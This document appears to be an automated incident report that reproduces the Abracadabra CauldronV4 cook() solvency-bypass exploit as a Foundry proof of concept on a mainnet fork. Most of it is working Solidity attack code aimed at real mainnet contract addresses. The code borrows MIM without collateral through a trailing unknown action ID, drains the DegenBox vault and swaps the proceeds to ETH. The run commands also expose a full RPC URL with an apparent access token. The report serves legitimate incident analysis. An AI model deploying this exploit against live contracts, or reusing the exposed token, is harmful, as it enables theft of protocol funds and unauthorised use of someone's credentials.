## Overview & Context

This proof-of-concept (PoC) reproduces the Abracadabra PrivilegedCauldronV4 MIM lending exploit in which a logic bug in `CauldronV4.cook` and its `_additionalCookAction` hook allows an attacker to borrow MIM without posting collateral, drain MIM from the shared DegenBox vault, and swap it to ETH for profit.  
On Ethereum mainnet (block 23,504,546), the real attacker used a helper contract to call two PrivilegedCauldronV4 clones with a crafted `cook([5,0],[0,0],datas)` sequence. The trailing unknown action ID (`0`) reset `CookStatus.needsSolvencyCheck` so the final `_isSolvent` check was skipped, leaving the helper deeply insolvent while the transaction completed successfully.

The PoC targets the same production contracts and state, but uses fresh attacker identities on a forked mainnet environment:

- MIM token: `0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3`
- DegenBox MIM vault: `0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce`
- PrivilegedCauldronV4 clones (victims):
  - `0x6bcd99D6009ac1666b58CB68fB4A50385945CDA2`
  - `0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d`
- Uniswap V2 router: `0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D`
- USDC (swap hop): `0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48`

The PoC’s goal is to demonstrate, on mainnet-forked state:

- An unprivileged attacker can perform `cook([ACTION_BORROW, 0], ...)` against both Cauldrons.
- The helper contract ends with nonzero MIM-denominated debt and zero collateral in both Cauldrons, with `isSolvent(helper) == false`.
- The DegenBox vault’s MIM balance decreases materially.
- The attacker EOA realizes clear net ETH profit.

**Command to run the PoC (from the incident root):**

```bash
cd forge_poc
RPC_URL="https://<QUICKNODE_ENDPOINT_NAME>.quiknode.pro/<QUICKNODE_TOKEN>" forge test --via-ir -vvvvv
```

Using the project’s `.env` and `artifacts/poc/rpc/chainid_rpc_map.json`, this translates for Ethereum mainnet to:

```bash
cd /home/wesley/TxRayExperiment/incident-202601031300/forge_poc
RPC_URL="https://indulgent-cosmological-smoke.quiknode.pro/a6a53e47429a27dac299922d0d518c66c3875b2e" forge test --via-ir -vvvvv
```

The main test is `AbracadabraCauldronExploitTest.testExploit` in `forge_poc/test/Exploit.t.sol`.

---

## PoC Architecture & Key Contracts

### Roles and Components

- **Attacker EOA (test role):** A fresh address created via `makeAddr("attacker")`. It never coincides with the real incident EOA and serves as the profit recipient.
- **Attacker helper contract (`ExploitHelper`):** Locally deployed contract that:
  - Issues unsecured MIM borrows from both Cauldrons via `cook([5, 0], ...)`.
  - Withdraws the borrowed MIM from the shared DegenBox vault.
  - Swaps MIM → USDC → WETH → ETH through Uniswap V2.
  - Sends ETH proceeds to the attacker EOA.
- **Victim protocol contracts (on mainnet fork):**
  - Two PrivilegedCauldronV4 clones (`CAULDRON_ONE` and `CAULDRON_TWO`).
  - The shared DegenBox MIM vault.
  - The MIM ERC‑20 token.
- **DEX infrastructure:**
  - Uniswap V2 router and canonical USDC token, providing the `MIM → USDC → WETH → ETH` liquidity path.

### Key Helper Contract Logic

The helper contract reconstructs the attack path in a compact and readable form. The core structure (from `forge_poc/src/ExploitHelper.sol`) is:

```solidity
contract ExploitHelper {
    ICauldronV4 public immutable cauldronOne;
    ICauldronV4 public immutable cauldronTwo;
    IBentoBoxV1 public immutable bentoBox;
    IERC20 public immutable mim;
    IUniswapV2Router02 public immutable router;
    address public immutable attacker;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    uint256 public constant BORROW_AMOUNT_PER_CAULDRON = 5_000 ether;

    constructor(
        address _attacker,
        address _cauldronOne,
        address _cauldronTwo,
        address _router
    ) {
        attacker = _attacker;
        cauldronOne = ICauldronV4(_cauldronOne);
        cauldronTwo = ICauldronV4(_cauldronTwo);
        router = IUniswapV2Router02(_router);

        IBentoBoxV1 bentoBox_ = cauldronOne.bentoBox();
        bentoBox = bentoBox_;
        mim = cauldronOne.magicInternetMoney();
    }
}
```

**Snippet origin:** constructor of `ExploitHelper` in `forge_poc/src/ExploitHelper.sol`.  
**What it demonstrates:** how the helper binds to real mainnet Cauldrons, the shared DegenBox, MIM, and Uniswap router, while fixing a borrow size (5,000 MIM per Cauldron) large enough to clear oracle thresholds but small relative to overall liquidity.

---

## Adversary Execution Flow

### Test Setup (Environment and Labels)

The Foundry test `AbracadabraCauldronExploitTest` configures a mainnet fork and deploys the helper contract:

```solidity
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    vm.createSelectFork(rpcUrl, 23_504_545);

    attacker = makeAddr("attacker");

    vm.label(attacker, "Attacker");
    vm.label(DEGENBOX_VAULT, "DegenBox");
    vm.label(address(MIM), "MIM");
    vm.label(address(CAULDRON_ONE), "CauldronOne");
    vm.label(address(CAULDRON_TWO), "CauldronTwo");
    vm.label(UNISWAP_V2_ROUTER, "UniswapV2Router");

    attackerHelper = new ExploitHelper(
        attacker,
        address(CAULDRON_ONE),
        address(CAULDRON_TWO),
        UNISWAP_V2_ROUTER
    );
    vm.label(address(attackerHelper), "AttackerHelper");
}
```

**Snippet origin:** `setUp()` in `forge_poc/test/Exploit.t.sol`.  
**What it demonstrates:** the test uses a mainnet fork anchored just before the incident block and clearly labels all key protocol and adversary addresses for trace readability.

Immediately after labels, the test performs **oracle pre-checks** (see the “Oracle Definitions and Checks” section).

### Attack Orchestration (Test Harness)

The exploit itself is triggered via a simple wrapper:

```solidity
function reproducerAttack() public {
    vm.startPrank(attacker);
    attackerHelper.executeAttack();
    vm.stopPrank();
}
```

**Snippet origin:** `reproducerAttack()` in `forge_poc/test/Exploit.t.sol`.  
**What it demonstrates:** the attacker EOA uses `vm.prank` to act as the caller; the helper contract performs all exploit details, aligning directly with oracle HC_COOK_NO_REVERT’s specification.

### Exploit Steps Inside `ExploitHelper`

1. **Unsecured borrows via `cook([5, 0], ...)`**

```solidity
function _borrowFromCauldron(ICauldronV4 cauldron) internal {
    uint8[] memory actions = new uint8[](2);
    actions[0] = 5; // ACTION_BORROW
    actions[1] = 0; // unknown custom action id

    uint256[] memory values = new uint256[](2);
    bytes[] memory datas = new bytes[](2);

    datas[0] = abi.encode(int256(BORROW_AMOUNT_PER_CAULDRON), address(this));
    datas[1] = bytes("");

    cauldron.cook(actions, values, datas);
}
```

**Snippet origin:** `_borrowFromCauldron` in `forge_poc/src/ExploitHelper.sol`.  
**What it demonstrates:** the PoC precisely replicates the exploit pattern where `ACTION_BORROW` (ID `5`) is followed by an unknown action ID (`0`). The trailing unknown action routes into `_additionalCookAction`, which returns a zeroed `CookStatus`, clearing `needsSolvencyCheck` and preventing the final `_isSolvent` check from executing.

2. **Withdraw borrowed MIM from DegenBox and swap to ETH**

```solidity
function executeAttack() external {
    require(msg.sender == attacker, "ExploitHelper: not attacker");

    _borrowFromCauldron(cauldronOne);
    _borrowFromCauldron(cauldronTwo);

    uint256 mimShare = bentoBox.balanceOf(mim, address(this));
    if (mimShare == 0) return;
    bentoBox.withdraw(mim, address(this), address(this), 0, mimShare);

    uint256 mimBal = mim.balanceOf(address(this));
    if (mimBal == 0) return;
    mim.approve(address(router), mimBal);

    address[] memory path = new address[](3);
    path[0] = address(mim);
    path[1] = USDC;
    path[2] = router.WETH();

    router.swapExactTokensForETH(
        mimBal,
        0,
        path,
        attacker,
        block.timestamp
    );
}
```

**Snippet origin:** `executeAttack()` in `forge_poc/src/ExploitHelper.sol`.  
**What it demonstrates:** the helper becomes the borrower of MIM in both Cauldrons, then withdraws MIM from the shared DegenBox vault and swaps it to ETH via Uniswap V2, sending the ETH directly to the attacker EOA. This mirrors the real incident’s asset movements (MIM drained from DegenBox, profit realized in ETH).

### Profit and Invariant Checks (End-to-End)

The main test function aggregates state before and after the exploit:

```solidity
function testExploit() public {
    uint256 attackerEthBefore = attacker.balance;
    uint256 vaultMimBefore = MIM.balanceOf(DEGENBOX_VAULT);

    Rebase memory totalBorrowOneBefore = CAULDRON_ONE.totalBorrow();
    Rebase memory totalBorrowTwoBefore = CAULDRON_TWO.totalBorrow();
    uint256 sumBorrowBefore =
        uint256(totalBorrowOneBefore.elastic) + uint256(totalBorrowTwoBefore.elastic);

    reproducerAttack();

    uint256 attackerEthAfter = attacker.balance;
    uint256 attackerProfit = attackerEthAfter - attackerEthBefore;
    uint256 vaultMimAfter = MIM.balanceOf(DEGENBOX_VAULT);
    uint256 mimOut = vaultMimBefore - vaultMimAfter;

    Rebase memory totalBorrowOneAfter = CAULDRON_ONE.totalBorrow();
    Rebase memory totalBorrowTwoAfter = CAULDRON_TWO.totalBorrow();
    uint256 sumBorrowAfter =
        uint256(totalBorrowOneAfter.elastic) + uint256(totalBorrowTwoAfter.elastic);
    uint256 debtDelta = sumBorrowAfter - sumBorrowBefore;

    // Invariant and profit checks follow...
}
```

**Snippet origin:** `testExploit()` in `forge_poc/test/Exploit.t.sol`.  
**What it demonstrates:** the PoC explicitly captures attacker ETH balance, DegenBox MIM balance, and combined Cauldron `totalBorrow` before and after the exploit, enabling precise oracle checks on solvency, victim depletion, and attacker profit.

---

## Oracle Definitions and Checks

The oracle specification in `artifacts/poc/oracle_generator/oracle_definition.json` defines variables, pre-checks, hard constraints, and soft constraints that the PoC must implement.

### Variables

- **`attacker` (role: Attacker):** Abstract adversary EOA whose ETH balance is used to measure profit.
  - **Implementation:** `address public attacker;` created via `makeAddr("attacker")` in `setUp()`.
- **`attacker_helper` (role: Attacker):** Adversary helper contract that borrows from the Cauldrons and executes the swap path.
  - **Implementation:** `ExploitHelper public attackerHelper;` deployed in `setUp()` and labelled `AttackerHelper`.
- **`mim_token` (role: Token, symbol: MIM):** Magic Internet Money ERC‑20.
  - **Implementation:** `IERC20 public constant MIM = IERC20(0x99D8…1e17F3);`.
- **`degenbox_vault` (role: Protocol):** Shared MIM DegenBox vault.
  - **Implementation:** `address public constant DEGENBOX_VAULT = 0xd96f…B9Fc2cce;`.
- **`cauldron_one`, `cauldron_two` (role: Protocol):** The two exploited PrivilegedCauldronV4 clones.
  - **Implementation:** `ICauldronV4View` constants bound to the mainnet clone addresses.
- **`eth` (role: Token, symbol: ETH):** Native ETH used as the profit reference asset.
  - **Implementation:** Profit measured via `attacker.balance` before and after the exploit.

### Pre-Checks

1. **Vault MIM liquidity is nonzero**
   - **Oracle description:** DegenBox vault must have nonzero MIM liquidity so unsecured borrows withdraw real MIM.
   - **Test implementation:** in `setUp()`:
     ```solidity
     uint256 vaultMimBefore = MIM.balanceOf(DEGENBOX_VAULT);
     assertGt(vaultMimBefore, 0);
     ```

2. **Cauldron–DegenBox wiring matches mainnet**
   - **Oracle description:** Both exploited Cauldrons must use the shared DegenBox vault as `bentoBox`.
   - **Test implementation:**
     ```solidity
     assertEq(address(CAULDRON_ONE.bentoBox()), DEGENBOX_VAULT);
     assertEq(address(CAULDRON_TWO.bentoBox()), DEGENBOX_VAULT);
     ```

3. **Attacker helper starts with no debt or collateral**
   - **Oracle description:** `attacker_helper` should have zero `userBorrowPart` and zero `userCollateralShare` in both Cauldrons pre-exploit.
   - **Test implementation:**
     ```solidity
     assertEq(CAULDRON_ONE.userBorrowPart(address(attackerHelper)), 0);
     assertEq(CAULDRON_ONE.userCollateralShare(address(attackerHelper)), 0);
     assertEq(CAULDRON_TWO.userBorrowPart(address(attackerHelper)), 0);
     assertEq(CAULDRON_TWO.userCollateralShare(address(attackerHelper)), 0);
     ```

### Hard Constraints

1. **HC_SOLVENCY_CAULDRON_ONE / HC_SOLVENCY_CAULDRON_TWO**  
   - **Oracle description:** After the exploit, in each Cauldron, `attacker_helper` must have:
     - Nonzero MIM-denominated debt (`userBorrowPart > 0`),
     - Zero posted collateral (`userCollateralShare == 0`),
     - `isSolvent(attacker_helper) == false`.
   - **Test implementation (both Cauldrons):**
     ```solidity
     uint256 borrowPartAfter1 = CAULDRON_ONE.userBorrowPart(address(attackerHelper));
     uint256 collateralShareAfter1 = CAULDRON_ONE.userCollateralShare(address(attackerHelper));
     assertGt(borrowPartAfter1, 0);
     assertEq(collateralShareAfter1, 0);
     assertFalse(CAULDRON_ONE.isSolvent(address(attackerHelper)));
     // same pattern for CAULDRON_TWO
     ```

2. **HC_COOK_NO_REVERT**  
   - **Oracle description:** The crafted `cook([ACTION_BORROW, unknownId], [0,0], datas)` sequence must succeed for an unprivileged attacker and must not revert, despite leaving the helper insolvent.
   - **Test implementation:** the `reproducerAttack()` wrapper:
     ```solidity
     vm.prank(attacker);
     reproducerAttack(); // calls attackerHelper.executeAttack()
     ```
     If `cook` reverted, the test would fail; it instead runs to completion on the fork, confirming the missing solvency check.

3. **HC_PROFIT_ASSET_ETH**  
   - **Oracle description:** Net profit must be realized in native ETH, not an unrelated token.
   - **Test implementation:**
     ```solidity
     uint256 attackerEthBefore = attacker.balance;
     // ...
     uint256 attackerEthAfter = attacker.balance;
     assertGt(attackerEthAfter, attackerEthBefore);
     ```
     This ensures the adversary ends with strictly more ETH than they started with.

### Soft Constraints

1. **SC_ATTACKER_ETH_PROFIT**  
   - **Oracle description:** Adversary should realize at least `0.0001 ETH` net profit, reflecting a clear gain even if the PoC sizes the borrow smaller than the real incident.
   - **Test implementation:**
     ```solidity
     uint256 attackerProfit = attackerEthAfter - attackerEthBefore;
     assertGe(attackerProfit, 0.0001 ether);
     ```

2. **SC_DEGENBOX_MIM_DEPLETION**  
   - **Oracle description:** DegenBox MIM balance must decrease by at least `1,000 MIM`, showing a meaningful unsecured outflow.
   - **Test implementation:**
     ```solidity
     uint256 vaultMimBefore = MIM.balanceOf(DEGENBOX_VAULT);
     // ...
     uint256 vaultMimAfter = MIM.balanceOf(DEGENBOX_VAULT);
     uint256 mimOut = vaultMimBefore - vaultMimAfter;
     assertGe(mimOut, 1_000 ether);
     ```

3. **SC_CAULDRON_TOTALBORROW_INCREASE**  
   - **Oracle description:** Combined `totalBorrow.elastic` for both Cauldrons must rise by at least the equivalent of `1,000 MIM`, reflecting new unsecured debt recorded at the protocol level.
   - **Test implementation:**
     ```solidity
     uint256 sumBorrowBefore =
         uint256(totalBorrowOneBefore.elastic) + uint256(totalBorrowTwoBefore.elastic);
     // after exploit
     uint256 sumBorrowAfter =
         uint256(totalBorrowOneAfter.elastic) + uint256(totalBorrowTwoAfter.elastic);
     uint256 debtDelta = sumBorrowAfter - sumBorrowBefore;
     assertGe(debtDelta, 1_000 ether);
     ```

Collectively, these checks mean the PoC fully implements the oracle specification; all pre-checks, hard constraints, and soft constraints pass on the mainnet fork.

---

## Validation Result and Robustness

The PoC Validator Agent executed the PoC according to the incident instructions:

- **Execution command:**  
  `RPC_URL="https://indulgent-cosmological-smoke.quiknode.pro/a6a53e47429a27dac299922d0d518c66c3875b2e" forge test --via-ir -vvvvv`  
  (run from `forge_poc`, with output logged to `artifacts/poc/poc_validator/forge-test.log`).
- **Observed result:**  
  The suite completed with `1 tests passed, 0 failed`, and the detailed trace shows:
  - Nonzero unsecured borrow parts and zero collateral shares for the helper in both Cauldrons.
  - `isSolvent(helper)` returning `false` in both Cauldrons.
  - DegenBox MIM balance decreasing during the exploit.
  - The attacker receiving ETH via Uniswap swap and WETH withdrawal.

The validator’s structured result is recorded at  
`artifacts/poc/poc_validator/poc_validated_result.json` with:

- `overall_status: "Pass"`
- `poc_correctness_checks.passes_validation_oracles.passed: true`
- All quality checks marked `passed: true`, including:
  - Oracle alignment with the definition.
  - Human readability and labeling.
  - No unexplained magic numbers.
  - Mainnet-fork execution with no core mocks.
  - Self-contained attacker identities (no reuse of real attacker EOA or helper contract).
  - End-to-end attack process coverage.
  - Alignment with the root cause report.

In particular, the trace log (`forge-test.log`) confirms that the `cook` sequence executes without revert despite leaving the helper insolvent and that the protocol’s `totalBorrow` state and the DegenBox MIM balance move in the expected exploit directions.

---

## Linking PoC Behavior to Root Cause

The root cause analysis (`root_cause_report.md` and `root_cause.json`) identifies a logic bug in `CauldronV4.cook`:

- `cook` tracks a `CookStatus` struct with a `needsSolvencyCheck` flag.
- Actions like `ACTION_BORROW` set `needsSolvencyCheck = true`.
- At the end of the action sequence, if `needsSolvencyCheck` is true, `cook` calls `updateExchangeRate()` and `_isSolvent(msg.sender, _exchangeRate)` and reverts if the user is insolvent.
- The extension hook `_additionalCookAction` is invoked for unrecognized action IDs; the default implementation returns a zero-initialized `CookStatus`, and `cook` overwrites its local `status` with this zeroed value.
- Consequently, a trailing unknown action ID can clear `needsSolvencyCheck`, preventing the final solvency check from running.

The PoC directly exercises this flaw:

- `ExploitHelper._borrowFromCauldron` builds an action array `[5, 0]`:
  - `5` = `ACTION_BORROW`, which sets `needsSolvencyCheck = true`.
  - `0` = unknown action ID, which routes into `_additionalCookAction` and resets `status` to all zeros.
- The PoC does not attempt to adjust any protocol parameters or rely on privileged roles; it calls `cook` as an unprivileged contract, matching the ACT characterization of the incident.

The resulting behavior matches the root cause description:

- After `cook([5, 0], ...)`:
  - `userBorrowPart(attackerHelper)` is large and nonzero in both Cauldrons.
  - `userCollateralShare(attackerHelper)` remains `0`.
  - Protocol view `isSolvent(attackerHelper)` returns `false`.
  - Yet, because `needsSolvencyCheck` was cleared by the trailing unknown action, no revert occurs and the transaction commits.

The PoC’s assertions connect these states back to the ACT framing:

- **Adversary-crafted transaction:** Simulated by the attacker EOA calling `reproducerAttack()`, which delegates the exploit to the helper contract on a mainnet fork.
- **Victim state mutation:** Unsecured MIM borrows increase `totalBorrow.elastic` and reduce DegenBox MIM balances, leaving the protocol with bad debt.
- **Success predicate (profit):** The attacker’s net ETH balance increases by at least `0.0001 ETH`, demonstrating a positive ETH gain funded by the protocol’s unsecured debt.

Together, the PoC and its validation results provide a faithful, end-to-end reproduction of the Abracadabra CauldronV4 cook solvency-bypass incident, with clear links from exploit mechanics to protocol-level invariants and quantitative loss/profit measures.

